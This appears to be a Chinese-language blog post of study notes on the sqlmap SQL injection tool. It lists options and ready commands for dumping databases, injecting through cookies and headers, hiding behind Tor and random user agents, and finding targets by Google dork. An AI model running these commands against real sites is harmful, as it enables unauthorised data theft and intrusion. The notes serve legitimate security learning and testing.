---
layout:     post
title:     工具（一）sqlmap
subtitle:   这个系列是安全相关工具的介绍、参数使用、常用指令等等用法心得体会，有些常用的工具会记得比较细。本章是sqlmap笔记。
date:       2020-12-06
author:     HouKC
header-img: img/home-bg-o.jpg
catalog:    true
tags:
    - 工具
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
---



## 0x00 常用指令

- SQL注入测试，并且按照默认自动完成用户交互。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch 
```

- 获取当前数据库

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --current-db
```

- 获取所有数据库

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --dbs
```

- 指定数据库类型为MySQL，获取表名

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --dbms "MySQL" -D [数据库名] --tables
```

- 指定库名、表名，获取列名

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --dbms "MySQL" -D [数据库名] -T [表名] --columns
```

- 指定库名、表名、列名，获取数据

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --dbms "MySQL" -D [数据库名] -T [表名] -C "[列名1],[列名2]" --dump
```

- 将HTTP请求内容保存在request.txt文件中，从文件打开，指定使用布尔、时间盲注进行测试

```
sqlmap -r request.txt --batch --current-db --technique BT
```

- 使用最高级别的Payload测试，并且使用一些更具风险（可能影响网站）的Payload，开启线程最大，即10个线程进行测试

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --current-db --level 5 --risk 3 --threads 10
```



## 0x01 --technique

sqlmap设置具体SQL注入技术

- --technique T   指明基于时间的盲注（Time-based blind）
- --technique B   指定基于布尔的盲注（Boolean-based blind）
- --technique E   指定报错注入（Error-based）
- --technique U  指定Union查询注入（Union query-based）
- --technique S   指定堆叠注入（Stacked queries）
- --technique Q  指定内联查询注入（Inline queries）
- --technique BT  指定基于时间和布尔（其实就是叠加使用，其他同理）



## 0x02 --hex

对注入的参数进行十六进制编码。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --hex
```



## 0x03 --search

可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。

参数“–search”要和下列参数之一配合使用：

- -C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索
- -T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索
- -D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索

在搜索时，Sqlmap会询问用户进行精确搜索还是包含搜索。

默认为包含搜索，即搜索的字符串包含于结果中就认为命中。

精确搜索要求搜索的字符串与结果完全相等。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --search -D [库名]
```



## 0x04 --version

查看版本信息

```
sqlmap --version
```



## 0x05 -d

直连数据库。

#### 1. 服务型数据库（前提直到数据库用户名和密码）

DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME(MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.)

例如：

```
sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
```

#### 2. 文件型数据库（前提知道数据库绝对路径）

DBMS://DATABASE_FILEPATH(SQLite, Microsoft Access, Firebird, etc.)



## 0x06 -l、-x、-m、-r、-c、-g

从不同类型的文件中读取目标进行SQL注入探测

- -l 从Burpsuite proxy或WebScarab proxy中读取Http请求日志文件

其中日志文件需要在 Burpsuite->project options->Misc->logging，把 Proxy:Requests 勾选上去，并填写保存目录和文件名，然后`-l [该文件名]`读取请求。

- -x 从sitemap.xml站点地图文件中读取目标探测
- -m 从多行文本格式文件读取多个目标，对多个目标进行探测
- -r 从文本文件中读取http请求作为SQL注入探测的目标

其中 -r 参数常用于检测消息头中的SQL注入，如referer、cookie等。

- -c 从配置文件 sqlmap.conf中读取目标探测
- -g 利用Google获取指定Google hack的目标，然后利用交互向导模式进行SQL注入探测。

```
sqlmap -g "inurl:\".php?id=1\""
```



## 0x07 --method

指定请求方法。

sqlmap会自动在探测过程汇总使用适合的HTTP请求方法，但是在某些情况下，需要强制使用具体的HTTP请求方法，如PUT请求。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --method=PUT
```


用 --data 可以隐式地更改为POST

```
sqlmap -u "http://xxx.com/xxx.php" --data='id=1' --dbs
```



## 0x08 -f、--banner、-b
fingerprint指纹，获取指纹信息，三个都是显示目标网站数据库管理系统DBMS的指纹信息（版本）。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" -f --banner -b
```



## 0x09 --data、--param-del
前者指定POST数据，后者指定分隔符。
```
sqlmap -u "http://xxx.com/xxx.php" --data="id=1&password=123" --param-del="&"
```



## 0x0a --cookie、--cookie-del、--load-cookie、--drop-set-cookie

#### 1. 用途

sqlmap用来设置cookie的参数。

- --cookie    指定cookie
- --cookie-del     指定分隔符
- --load-cookie    可以用来提供包含Netscape/wget格式的cookie特殊文件
- --drop-set-cookie     忽略任何即将到来的Set-Cookie头来避免自动测试Set-Cookie标头

#### 2. 使用场景

- Web应用程序具有基于cookie验证的过程
- 想利用cookie值上的sql注入漏洞

#### 3. sqlmap使用cookie过程

- 登录或浏览页面
- 打开审计工具或代理截断，复制cookie
- 在sqlmap中使用--cookie 粘贴cookie


注意：如果需要对Cookie进行注入，需要设置--level 2以上。



## 0x0b --random-agent、--user-agent

默认情况下，sqlmap使用以下用户代理头执行HTTP请求：sqlmap/1.0-dev-xxxxxx(http://sqlmap.org)

- --user-agent       通过提供自定义用户代理作为选项的参数
- --random-agent    sqlmap将从./txt/user-agent中随机选择一个用于会话中的所有HTTP请求

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
```

一些站点在服务端检测HTTP User-Agent值，如果不是一个合法的值，会中断链接，同时sqlmap会报错：

```
[hh:mm:20][ERROR] the target URL responded with an unknown HTTP status code, try to force the HTTP User-Agent header with option --user-agent or --random-agent
```


另外，针对User-Agent的值探测SQL注入，需要设置--level值为3，在保存好的请求包中，在User-Agent的值最末尾添加\*，然后输入以下语句进行测试。

```
sqlmap -r target.txt --level 3
```



## 0x0c --headers、--header、-H

设置额外的HTTP头，每个标头必须用换行符分隔，从配置INI文件中提供它们要容易得多（可以查看示例，sqlmap.conf文件）。

-H等价于--header。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --header="Host:www.target.com"
sqlmap -u "http://xxx.com/xxx.php?id=1" --headers="Host:www.target.com\nUser-agent:Firefox 1.0"
```



## 0x0d --auth-type、--auth-cred
其中 --auth-type 支持Basic、Digest、NTLM，一般用Basic就行。

--auth-cred 认证语法为：username:password，在访问该系统需要手动认证输入账号密码时用到。

```
sqlmap -u "http://xxxxx" --auth-type Basic --auth-cred "testuser:testpass"
```



## 0x0e --proxy、--proxy-cred、--proxy-file、--ignore-proxy
- --proxy：用来设置HTTP代理服务器位置

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --proxy http(s)://ip[:端口]
```

- --proxy-cred：用来设置HTTP代理服务器认证信息

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --proxy-cred username:password
```

- --proxy-file：用来设置多条代理在文件中
- --ignore-proxy：忽略系统范围内的HTTP(s)代理服务器设置来针对本地网络的目标部分运行sqlmap时，使用此方法。



## 0x0f --tor，--tor-port，--tor-type，--check-tor
连接tor网络进行匿名访问。

要先下载安装tor，然后启动tor服务。

```
apt-get install tor
service tor start
service tor status     //查看状态
```

然后选择tor。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --tor --tor-type http --check-tor
```

其中 --tor-type 有四种：HTTP，HTTPS，SOCKS4，SOCKS5。



## 0x10 --delay
延时访问速度。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --delay 0.5	   // 延时0.5秒访问
```



## 0x11 --timeout
设置超时，在考虑超时HTTP(S)请求之前，可以指定等待的秒数，有效值是一个浮点数，默认设置为30秒。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --timeout 10.5    //等待10.5秒超时
```



## 0x12 --retries
设置重试次数，默认3次。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --retries 5    //设置重连5次
```



## 0x13 --randomize
设置随机化参数，可以指定要在每次请求期间随机更改其值的参数名称。长度和类型根据提供的原始值保持一致。默认随机化。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --randomize id
```

其中id为参数名称。



## 0x14 --scope
设置日志过滤目标。

与使用选项 -l 使用从提供的日志解析的所有主机不同，可以指定有效的python正则表达式，用于过滤所需的日志。

```
sqlmap -l burp.log --scope="(www)?\.target\.(com|net|org)"
```

过滤其他，只选中正则匹配到的链接。



## 0x15 **--skip-urlencode**

不进行URL编码。



## 0x16 --ignore-401

用来忽略未验证错误，如果想测试偶尔返回HTTP错误401（未经授权的）的站点，而你想忽略它并在不提供适当凭证的情况下继续测试，可以使用--ignore-401。



## 0x17 --auth-file
sqlmap中设置HTTP协议私钥，当web服务器需要适当的客户端证书和用于身份验证的私钥时，应该使用此选项，提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --auth-file 文件名
```



## 0x18 --safe-url、--safe-post、--safe-req、--safe-freq
sqlmap设置安全模式，避免在多次请求失败后销毁会话。

有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时，原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。

通过这种方式，sqlmap将访问每个预定义数量的请求，而不对某个安全URL执行任何类型的注入。也就是说会跳过安全URL对一般的URL先进行注入，最后再尝试注入安全URL。这样可以防止那些安全URL访问失败导致会话中断。

- --safe-url：提供一个安全链接，测试中每隔一段时间都会去访问。
- --safe-post：同上，但是使用POST方式提交。
- --safe-req：同上，但是从文件中加载目标。
- --safe-freq：设置每测试多少注入语句后才去访问安全链接。



## 0x19 --keep-alive
sqlmap可以设置连接为持久连接，即在HTTP报文中设置`Connection:Keep-Alive`

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --keep-alive
```


这样可以减少连接次数，从而提高性能。



## 0x1a --null-connection
sqlmap中设置空连接，表示不接受HTTP当中的body，常用在盲注过程中。其实就是只检索没有body响应的请求，而不是所有请求，没有body响应的请求如HEAD请求，对端就不会返回body。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --null-connection
```



## 0x1b --threads
sqlmap中设置同时发送多少个HTTP请求的多线程，默认是1个线程，为了不影响目标站点服务器的性能，sqlmap可以设置最大的线程数为10。

```
sqlmap -u "http://xxx.com/xxx.php" --threads 10
```


通过设置多线程也可以提高sqlmap的性能。



## 0x1c --predict-output
sqlmap中的预测输出，在推理算法中用于检索值字符的顺序统计预测。

注意这个参数与 --thread 参数不兼容。

```
sqlmap -u "http://xxx.com/xxx.php" --dbs --predict-output
```


能在一定程度上提高sqlmap探测性能。



## 0x1d -o
开启所有提高性能的参数。

```
sqlmap -u "http://xxx.com/xxx.php" -o
```



## 0x1e -p、--skip、--param-exclude、--skip-static

- -p 指定具体探测的参数
- --skip 忽略探测具体的参数
- --param-exclude 忽略包含具体内容的参数
- --skip-static 忽略非动态参数

```
sqlmap -u "http://xxx.com/xxx.php" -p "id,user-agent"
sqlmap -u "http://xxx.com/xxx.php" --skip "user-agent, referer"
sqlmap -u "http://xxx.com/xxx.php" --param-exclude="token|session"    //不对包含token或session的参数进行探测。
```



## 0x1f --dbms
sqlmap DBMS指定，默认情况下会自动识别探测目标web应用程序的后端数据库管理系统（DBMS），以下列出sqlmap完全支持的DBMS种类：

- MySQL
- Oracle
- Microsoft SQL Server
- IBM DB2
- SQLite
- FIrebird
- Sybase
- SAP MaxDB
- HSQLDB
- Informix

```
sqlmap -u "http://xxx.com/xxx.php" --dbms [数据库管理系统名称] [版本号]        版本号可有可无
sqlmap -u "http://xxx.com/xxx.php" --dbms mysql 5.0
sqlmap -u "http://xxx.com/xxx.php" --dbms microsoft sql server 05    表示2005版本，08为2008版本
```



## 0x20 --os
sqlmap os指定，默认情况下自动识别目标后端操作系统（OS），sqlmap完全支持的OS种类：

- Linux
- Windows

```
sqlmap -u "http://xxx.com/xxx.php" --os windows
sqlmap -u "http://xxx.com/xxx.php" --os Linux
```





## 0xff 加星号\*

当注入点位于URI本身内部时，会出现一些特殊情况，除非手动指向URI路径，否则sqlmap不会对URI路径执行任何自动测试。必须在命令行中添加型号（\*）来指定这些注入点。

例如：当使用Apache web服务器的mod_rewrite模块或其他类似的技术时，就特别有用。

```
sqlmap -u "http://www.target.com/param1/value1*/param2/value2/"
```

相当于指定value1处为注入点。

任意位置注入：

与URI注入点类似，星号（*）（注意：这里也支持Havij样式%INJECT %）也可以用来指向GET、POST或HTTP头中的任意注入点。注入点可以通过在带有选项 -u 的GET参数值、带有选项-数据的POST参数值、带有选项 -H 的HTTP头值、带有选项-头、用户代理、引用和/或cookie的HTTP头值中指定，或者在带有选项-r的文件中加载的HTTP请求的通用位置指定。

```
sqlmap -u "http://xxx.com/xxx.php" --cookie="param1=value1*;param2=value2"
```

